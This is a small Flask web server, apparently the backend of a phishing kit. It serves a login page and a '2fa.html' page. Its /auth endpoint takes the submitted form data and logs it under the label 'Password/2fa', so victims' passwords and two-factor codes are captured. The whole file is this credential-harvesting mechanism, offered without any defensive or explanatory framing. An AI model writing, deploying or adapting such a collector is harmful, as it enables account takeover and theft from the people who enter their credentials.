from flask import Flask, request, make_response, send_file
import logging
app = Flask(__name__)
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
@app.route('/auth', methods=['POST'])
def auth():
    # Access the request body
    request_body = request.form.to_dict()
    # Print the request body
    app.logger.info(f"Password/2fa : {request_body}" )
    return 'OK'

@app.route('/')
def index():
    # Render the template
    response = make_response(send_file("index.html"))
    response.headers.add("Access-Control-Allow-Origin" , "*")
    return response

@app.route('/login')
def login():
    return send_file('2fa.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)